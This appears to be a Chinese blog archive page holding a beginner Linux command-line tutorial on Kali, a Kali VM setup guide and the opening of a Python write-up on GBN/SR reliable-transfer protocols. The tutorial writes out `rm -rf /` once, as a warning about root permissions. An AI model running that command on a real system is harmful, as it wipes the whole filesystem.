<p>让我们输入 <code>pwd</code> （print working directory）来确认一下，这个指令能够告诉我们现在我们在哪：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">pwd</span>                </span><br><span class="line">/home/kali</span><br></pre></td></tr></table></figure>

<p>实际上，<code>~</code> 这个特殊符号就表示当前用户（kali）的家目录。我们可以把这里当作桌面一样的地方来保存文件。</p>
<p>常用的文件系统指令包括：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span>    <span class="comment"># 我在哪？</span></span><br><span class="line">$ <span class="built_in">ls</span>     <span class="comment"># 这里有什么？</span></span><br><span class="line">$ <span class="built_in">cd</span> xxx <span class="comment"># 我要去xxx文件夹</span></span><br><span class="line">$ <span class="built_in">cd</span> ..  <span class="comment"># 我要去上一级文件夹</span></span><br><span class="line">$ <span class="built_in">mv</span>     <span class="comment"># 移动文件</span></span><br><span class="line">$ <span class="built_in">cp</span>	   <span class="comment"># 复制文件</span></span><br><span class="line">$ <span class="built_in">rm</span> xxx <span class="comment"># 删除文件 (文件夹要加上-r参数)</span></span><br><span class="line">$ <span class="built_in">mkdir</span>  <span class="comment"># 创建文件夹</span></span><br></pre></td></tr></table></figure>

<h3 id="文件读写：配置软件安装源（apt包管理器）"><a href="#文件读写：配置软件安装源（apt包管理器）" class="headerlink" title="文件读写：配置软件安装源（apt包管理器）"></a>文件读写：配置软件安装源（apt包管理器）</h3><p>文件夹中，不仅有着目录，还有着其他的文件。接下来我们以配置软件安装源为例，展示文件相关的操作。</p>
<p>在Linux上，有着被称为软件包管理器的一类软件，负责统一管理系统上软件或库的安装、升级、卸载，类似苹果的App Store。由于这是统一管理的，所以安装软件或库会非常方便。</p>
<p>通常而言，在国内安装Linux之后，首先就是需要更改所使用的软件包管理器（Ubuntu和Kali都使用apt）的软件仓库地址（或者称为软件源）。由于某种神秘力量的影响，国内可能不能访问官方默认的软件源（或很慢），因此国内有许多组织都维护了镜像站（也就是官方源的国内镜像版本）。</p>
<p>比如说，可以使用由 USTC LUG（中科大 Linux User Group）维护的镜像服务，官方教程的链接是：<a target="_blank" rel="noopener" href="https://mirrors.ustc.edu.cn/help/">发行版镜像使用帮助</a>。</p>
<p>在上面这个教程中，可能写了这个：</p>
<blockquote>
<p>编辑 <code>/etc/apt/sources.list</code> 文件, 在文件最前面添加以下条目：……</p>
</blockquote>
<p>运用上面的知识，我们已经可以移动到 <code>/etc/apt/</code> 文件夹，并且用 <code>ls</code> 看到这个目录下确实有一个 <code>sources.list</code> 文件。</p>
<p>我们可以使用 <code>cat</code> 指令来查看这个文件有什么内容，只需要在 <code>cat</code> 后面加上这个文件的路径。由于这个文件就在当前文件夹，所以只需要输入文件名即可，这是一种相对路径。你可以使用tab键来让shell帮你自动补全文件名，减少输入的功夫。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/etc/apt]</span><br><span class="line">└─$ <span class="built_in">cat</span> sources.list</span><br><span class="line"><span class="comment"># See https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware</span><br><span class="line"></span><br><span class="line"><span class="comment"># Additional line for source packages</span></span><br><span class="line"><span class="comment"># deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure>

<p>现在这个文件里已经有这么几行链接了，接下来我们尝试使用 <code>nano</code> 编辑器来对其进行编辑，还是和上次一样，只需要在 <code>nano</code> 后面加上文件名（也就是用相对路径引用这个文件）：</p>
<p><code>$ nano sources.list</code></p>
<p>打开后，我们会在底下发现一行红色报错：<code>File &#39;sources.list&#39; is unwritable</code></p>
<h4 id="Linux用户、用户组、权限"><a href="#Linux用户、用户组、权限" class="headerlink" title="Linux用户、用户组、权限"></a>Linux用户、用户组、权限</h4><p>真的unwritable吗？如wri。</p>
<p>Linux系统给许多重要的文件、目录都设置了权限要求，没有权限的普通用户没办法修改。（是的，默认的用户kali是普通用户）在Linux系统中，有一个特殊的用户叫做root，几乎拥有一切权限，但为了这台计算机系统的安全起见，我们一般都不会登录这个用户。</p>
<p>试想一下，当你一不小心在命令行上敲出了 <code>rm -rf /</code> （对整个文件系统进行删除），如果你这时候还是普通用户的话，系统会提示你权限不够，从而保护了自己。但如果你是root用户的话……和这台系统说再见吧~</p>
<p>我们可以用 <code>ls -l</code> 来查看当前目录下各种文件的详细信息，其中各列信息如下所示：</p>
<table>
<thead>
<tr>
<th>文件属性</th>
<th>文件数</th>
<th>拥有者</th>
<th>所属group</th>
<th>文件大小</th>
<th>创建时间</th>
<th>文件名</th>
</tr>
</thead>
<tbody><tr>
<td>drwxr-xr-x</td>
<td>2</td>
<td>root</td>
<td>root</td>
<td>4096</td>
<td>Jun  3 13:38</td>
<td>apt.conf.d</td>
</tr>
<tr>
<td>-rw-r–r–</td>
<td>1</td>
<td>root</td>
<td>root</td>
<td>1033</td>
<td>Jan  1 10:12</td>
<td>sources.list</td>
</tr>
</tbody></table>
<p>文件属性一共有十个字母，第0个表示文件类型，d指directory，-指普通文件。</p>
<p>1<del>3，4</del>6，7~9分别为一组，分别表示文件所有者、所属group用户、其他用户对文件的权限。r表示可读（readable），w表示可写（writable），x表示可执行（executable）。</p>
<p>我们观察sources.list的文件属性，可以发现root用户可以进行读写，而root group的用户和其他用户都只读。</p>
<p>因此，为了修改这个文件，我们必须要使用root用户的权限。好在这有一种简单的方法可以做到：在想要执行的指令之前加上 <code>sudo</code>。因此我们还是可以写的。</p>
<p>更多细节可以参考本系列的下一篇教程，不过下一篇教程难度距离本篇高了一截，推荐已经使用一段时间Linux、对计算机整体架构有基本认识的读者阅读。</p>
<h4 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h4><p>我们观察nano底部的操作栏，可以找到左下角的Exit。这里的 <code>^X</code> 表示Ctrl+X的意思。因此我们使用这个组合键来退出。退出以后，我们按 ↑ 键即可取出上次我们执行的指令，然后再敲 Home 键（数字键盘附近的）将光标提到最前面，输入 <code>sudo</code>空格，敲击enter。</p>
<p><code>$ sudo nano sources.list</code></p>
<p>这里会提示我们输入密码，如果是kali系统就输入默认密码 <code>kali</code>。</p>
<p>进入nano编辑器的界面后，复制中科大源的两个链接，将光标移到开头之后使用 Ctrl+Shift+V 来将其黏贴上去。这个编辑器的逻辑和我们常用的记事本等差不多，所以大家可以自行修改。</p>
<p>修改完成以后，先使用 Ctrl+S 进行保存，然后再 Ctrl+X 退出即可。</p>
<blockquote>
<p>当然你也可以用教程中的其他方法完成换源</p>
</blockquote>
<p>感觉如何？命令行的编辑器也可以非常强大，不论是功能性、美观性还是方便性的角度都是如此。有一款各种Linux都会自带的编辑器被许多人称为”编辑器之神“，它就是大名鼎鼎的Vim。如果你有兴趣，可以在 <a target="_blank" rel="noopener" href="https://missing-semester-cn.github.io/2020/editors/">编辑器 (Vim) · the missing semester</a> 进行了解。</p>
<h3 id="好吧我知道这个很有用-但是这个指令咋用啊-：tldr"><a href="#好吧我知道这个很有用-但是这个指令咋用啊-：tldr" class="headerlink" title="好吧我知道这个很有用,但是这个指令咋用啊?：tldr"></a>好吧我知道这个很有用,但是这个指令咋用啊?：tldr</h3><p>在计算机的世界中，有着许许多多的奇怪缩写，接下来介绍的这个软件就有一个非常奇怪的缩写：<code>tldr</code></p>
<blockquote>
<p>too long don’t read: 太长不看</p>
</blockquote>
<p>接下来我们将会展示如何安装这个软件。在安装软件之前，先更新一下本地的资源目录是一个很好的习惯：</p>
<p><code>$ sudo apt update</code></p>
<p>它会提示你有多少个包可以更新，我们可以选择先别管他，因为刚刚安装系统后更新可能要很久（我这里有781个包要更新）。我们输入：</p>
<p><code>$ sudo apt install tldr</code></p>
<p>经过一些提示信息，当我们再次看到prompt的时候，就说明这个软件已经装好了。我们可以试着运行一下它，来看看到底是不是装好了：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ tldr</span><br><span class="line">tealdeer 1.5.0</span><br><span class="line">Danilo Bargen &lt;mail@dbrgn.ch&gt;, Niklas Mohrin &lt;dev@niklasmohrin.de&gt;</span><br><span class="line">A fast TLDR client</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    tldr [OPTIONS] [COMMAND]...</span><br><span class="line"></span><br><span class="line">ARGS:</span><br><span class="line">    &lt;COMMAND&gt;...    The <span class="built_in">command</span> to show (e.g. `tar` or `git <span class="built_in">log</span>`)</span><br><span class="line">    </span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>接下来，我们还需要更新一下这个软件的本地缓存（可能会有些慢）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tldr --update  <span class="comment"># 你也可以用-u来代替--update</span></span><br><span class="line">Successfully updated cache.</span><br></pre></td></tr></table></figure>

<p>在这之后，我们就可以愉快地使用这个软件了！让我们用一个经典的递归式查询来查询一下tldr的用法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ tldr tldr    </span><br><span class="line"></span><br><span class="line">  Display simple <span class="built_in">help</span> pages <span class="keyword">for</span> command-line tools from the tldr-pages project.</span><br><span class="line">  More information: &lt;https://tldr.sh&gt;.</span><br><span class="line"></span><br><span class="line">  Print the tldr page <span class="keyword">for</span> a specific <span class="built_in">command</span> (hint: this is how you got here!):</span><br><span class="line"></span><br><span class="line">      tldr <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">  Print the tldr page <span class="keyword">for</span> a specific subcommand:</span><br><span class="line"></span><br><span class="line">      tldr command-subcommand</span><br><span class="line"></span><br><span class="line">  Print the tldr page <span class="keyword">for</span> a <span class="built_in">command</span> <span class="keyword">for</span> a specific [p]latform:</span><br><span class="line"></span><br><span class="line">      tldr -p android|linux|osx|sunos|windows <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">  [u]pdate the <span class="built_in">local</span> cache of tldr pages:</span><br><span class="line"></span><br><span class="line">      tldr -u</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>想知道什么指令的用法，或者不记得哪个指令怎么用了，直接使用 <code>tldr &lt;命令名&gt;</code> 就能快速地查到这个软件常用的用法了。</p>
<p>作为习题，你可以挑战一下快速找到如何使用apt来列出本机安装的软件包、如何将本机的软件包升级到最新的版本、以及如何删除一个软件包（删除时请一定小心！初学时笔者曾尝试删除python2，导致系统里许多依赖python的软件都无法正常运行，桌面软件都爆炸了，花了好久才给救回来）。</p>
<h3 id="查询非常用用法：Manual手册"><a href="#查询非常用用法：Manual手册" class="headerlink" title="查询非常用用法：Manual手册"></a>查询非常用用法：Manual手册</h3><p>我们使用tldr查询用法时，实际上是一种”非官方渠道“，也就是由非官方的组织收集得来的常用用法。这其实并不能保证查到的用法一定是正确的、我们想要的，也不能帮助我们将一个软件的功能发挥到极致。</p>
<p>如何查询一个指令&#x2F;软件的官方用法？答案是使用 <code>man</code> 指令，其全称是 <code>manual</code> （手册）。基本上每个软件或指令都会有对应的、由官方编写的、规范化的文档，我们通过man来阅读它们。如果没有对应的 man page 的话，这表示这个指令可能是由shell程序自己实现的而不是一个独立的软件，这时候可以通过 <code>help xxx</code> 来查看其用法。</p>
<p>这里又引出了另一个非常奇怪的缩写：<strong>RTFM</strong>，以下是两种解释（看你想如何理解）</p>
<blockquote>
<p>Read the F**king Manual：快™去读手册！！</p>
<p>Read the Friendly Manual：去看看友好的手册吧~</p>
</blockquote>
<p>早年间，很多伸手党小白会在网络上提非常简单的问题，这时候懒得回答的暴躁老哥就会说出这句经典缩写。这个小故事启发我们：当遇到不懂的事情，多查查手册这一官方出品的一手资料，慢慢地你一定会变得更有耐心、更能解决问题、<del>英语阅读分更高</del>。</p>
<p>另外，在man的页面当中使用 <code>/</code> 可以在当前文档中向后搜索关键词，使用 <code>n</code> 来切换到下一个搜索结果，使用 <code>shift+n</code> （就是大写N）来切换到上一个搜索结果。这个功能会很有用。</p>
<p>让我们做个小练习，请借助 <code>man ls</code> ，找到能做到以下效果的指令：</p>
<ul>
<li>打印隐藏的文件</li>
<li>大小以人类可以理解的格式显示（比如显示 454M 而不是 454279954）</li>
<li>文件以最近访问顺序排序</li>
</ul>
<h3 id="我是MARIO：iostream重定向-amp-pipes管道"><a href="#我是MARIO：iostream重定向-amp-pipes管道" class="headerlink" title="我是MARIO：iostream重定向 &amp; pipes管道"></a>我是MARIO：iostream重定向 &amp; pipes管道</h3><p>上过C语言和C++的大家应该知道，命令行程序有三个默认打开的“流”，分别是stdin，stdout以及stderr。在我们运行命令行程序时，标准输入就是我们敲进去的东西，而程序打印东西到stdout或者stderr，其实就是打印到命令行上。</p>
<p>在学习C或C++的文件操作的时候，会发现一个很巧的事情——文件读写用到的API，和标准输入输出用的那些API其实都差不多，这是因为文件和标准输入输出本来就是一样的。在Linux系统中，<strong>一切皆文件</strong>。不仅传统意义上的文本文件、多媒体文件等普通文件是文件，套接字（网络接口）、键盘鼠标设备等等都是文件，可以用统一的一套文件API进行处理。</p>
<p>这种设计不仅带来了极大的统一性，也带来了极大的便捷性。本节介绍的iostream重定向和pipes管道就与这种设计有关。</p>
<p>既然stdin和stdout也是<strong>文件流</strong>，那么我们当然可以把他们<strong>重定向</strong>到一个普通文件！我们让一个文件被定向到一个程序的标准输入，或者让一个程序的标准输出定向到一个文件当中。前者我们使用 <code>&lt; file</code>，后者我们使用 <code>&gt; file</code>，如下所示：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hello &gt; hello.txt		<span class="comment"># 把stdout重定向到hello.txt中</span></span><br><span class="line">$ <span class="built_in">cat</span> hello.txt</span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> &lt; hello.txt				<span class="comment"># 把hello.txt重定向到cat的标准输入</span></span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> &lt; hello.txt &gt; hello2.txt	<span class="comment"># 同时重定向cat的标准输入和标准输出</span></span><br><span class="line">$ <span class="built_in">cat</span> hello2.txt</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>

<p>那我们能不能把两个程序首位相连呢？把第一个程序的标准输出用作第二个程序的标准输入，在这两个程序之间构造一条虚拟的管道！这种神奇的操作是通过 <code>|</code> 来完成的：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> 1.txt           </span><br><span class="line">GODEL</span><br><span class="line">ESCHER</span><br><span class="line">BACH</span><br><span class="line">$ <span class="built_in">cat</span> 1.txt | <span class="built_in">tail</span> -n1	<span class="comment"># 打印1.txt的最后一行</span></span><br><span class="line">BACH</span><br><span class="line">$ <span class="built_in">cat</span> 1.txt | grep CH 	<span class="comment"># 寻找1.txt中带有CH的行</span></span><br><span class="line">ESCHER</span><br><span class="line">BACH</span><br></pre></td></tr></table></figure>

<p><del>据说，传奇的命令行大师会用管道构造一长条链，我们尊称其为Mario。</del></p>
<h2 id="Play-with-Shell"><a href="#Play-with-Shell" class="headerlink" title="Play with Shell"></a>Play with Shell</h2><p>接下来，笔者推荐有空的读者试试看一个<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wargame_(hacking)">Wargame</a>，链接是<a target="_blank" rel="noopener" href="https://overthewire.org/wargames/bandit/">OverTheWire: Bandit</a>。这个闯关游戏能帮助初学者快速掌握各种命令行常用工具的用法。在有了本教程的基础以后，这个游戏仍然有一定的挑战性，需要广泛地收集资料。</p>
<p>在这里，最后介绍一个奇怪的缩写：<strong>STFW</strong></p>
<blockquote>
<p>Search The Friendly Web: 去搜搜互联网吧，相信你能找到想要的</p>
</blockquote>
<blockquote>
<p>Remember - this stuff is not easy if you don’t know much, so google everything, question everything, and sooner or later you’ll be down the rabbit hole far enough to be enjoying yourself.</p>
<p>— How to start hacking? - r&#x2F;hacking</p>
</blockquote>
<p>祝愿大家能通过这个Wargame，从此发现一个不一样的计算机世界。</p>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>强烈推荐：<a target="_blank" rel="noopener" href="https://missing-semester-cn.github.io/">计算机教育中缺失的一课 · the missing semester</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Tool/47d132dae007.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Tool/47d132dae007.html" class="post-title-link" itemprop="url">【Tool#0x01】Linux(Kali) 环境配置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-25 19:30:00" itemprop="dateCreated datePublished" datetime="2023-06-25T19:30:00+08:00">2023-06-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:24" itemprop="dateModified" datetime="2024-01-11T16:34:24+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Tool/" itemprop="url" rel="index"><span itemprop="name">Tool</span></a>
                </span>
            </span>

          
            <span id="/Tech/Tool/47d132dae007.html" class="post-meta-item leancloud_visitors" data-flag-title="【Tool#0x01】Linux(Kali) 环境配置" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Tool/47d132dae007.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Tool/47d132dae007.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>为了和之后的网络工具介绍环节联动，Linux常见指令教学将会使用Kali进行。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>首先需要装一个VMware。由于夏令营的安卓逆向部分会用到与hyper-V不兼容的安卓模拟器，因此这里不推荐WSL了 (&#96;ε´)。</p>
<p>VMware Workstation Player官网下载链接：<a target="_blank" rel="noopener" href="https://www.vmware.com/cn/products/workstation-player.html">VMware Workstation Player | VMware | CN</a></p>
<p>VMware Workstation Pro可以自行找链接下载（然后网上搜一个注册码），但是我们不鼓励盗版！</p>
<p>在安装完毕之后，我们直接下载开箱即用的Kali虚拟机，下载链接：<a target="_blank" rel="noopener" href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p>
<p>下载完之后，找一个好地方解压（这个Kali虚拟机需要一直保存在那个地方），然后打开VMware，在左上角的文件菜单中点击打开，找到你刚刚解压出来的文件夹中的 <code>kali-linux-...-amd64.vmx</code> 打开，这一步之后你就拥有了一台Kali虚拟机！</p>
<p>默认的账号和密码都是 <code>kali</code>，开始你的Linux之旅吧！</p>
<h2 id="MacOS-M1-x2F-M2"><a href="#MacOS-M1-x2F-M2" class="headerlink" title="MacOS(M1&#x2F;M2)"></a>MacOS(M1&#x2F;M2)</h2><p>请看<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1KM9H6lmGSSCM9gkZRkvwlg?pwd=tv8x">J3rry同学编写的教程</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Network/b81b909d9b2a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Network/b81b909d9b2a.html" class="post-title-link" itemprop="url">【Network#0x01】RDT协议实现（GBN和SR）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-05 14:33:29" itemprop="dateCreated datePublished" datetime="2023-06-05T14:33:29+08:00">2023-06-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:36" itemprop="dateModified" datetime="2024-01-11T16:34:36+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Network/" itemprop="url" rel="index"><span itemprop="name">Network</span></a>
                </span>
            </span>

          
            <span id="/Tech/Network/b81b909d9b2a.html" class="post-meta-item leancloud_visitors" data-flag-title="【Network#0x01】RDT协议实现（GBN和SR）" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Network/b81b909d9b2a.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Network/b81b909d9b2a.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在这学期计网的PJ中，我<del>被迫</del>实现了GBN协议、基于连接的全双工可信传输协议，并在此基础上改造了SR协议版本，并为其添加了基础的拥塞控制机制（AIMD）。<br>这是<a target="_blank" rel="noopener" href="https://github.com/Cameudis/RDT-protocol">Github项目仓库</a>。</p>
<p>主体是gbn.py以及sr.py，API接口模仿socket设计，均能连续通过200轮测试。下面是使用例（这就是全部API了）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sr_server.py</span></span><br><span class="line"><span class="keyword">from</span> sr <span class="keyword">import</span> SRSocket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line">s = SRSocket()</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line"></span><br><span class="line">s.listen()</span><br><span class="line">s.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Connected by&#x27;</span>, s.address)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;server/recv.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = s.recv()</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>: <span class="comment"># 空的数据包标识文件结束</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">s.send(<span class="string">b&quot;Thank you for your data!&quot;</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sn_client.py</span></span><br><span class="line"><span class="keyword">from</span> sr <span class="keyword">import</span> SRSocket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line">s = SRSocket()</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Connect to&#x27;</span>, s.address)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;client/data.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s.send(data)  <span class="comment"># 阻塞的</span></span><br><span class="line">s.send(<span class="string">b&quot;&quot;</span>)   <span class="comment"># 用空的payload表示文件发送结束</span></span><br><span class="line"><span class="built_in">print</span>(s.recv().decode())</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>客户端将会把图片 <code>client/data.jpg</code> 传输至服务器端，服务器保存图片至文件 <code>server/recv.jpg</code> 后，将会给客户端发送一条信息，客户端接收并将其打印出来。</p>
<p>由于是全双工的，所以客户端可以给服务器发送消息，服务器也可以给客户端发送消息。</p>
<h2 id="1-GBN"><a href="#1-GBN" class="headerlink" title="1 GBN"></a>1 GBN</h2><h3 id="1-1-准备"><a href="#1-1-准备" class="headerlink" title="1.1 准备"></a>1.1 准备</h3><p>为了保证全双工的一致性，从一开始就准备将服务器端协议实现和客户端协议实现放在一个类中，命名为GBNSocket。为了方便起见，我直接模仿socket的api，主要是如下这些函数：</p>
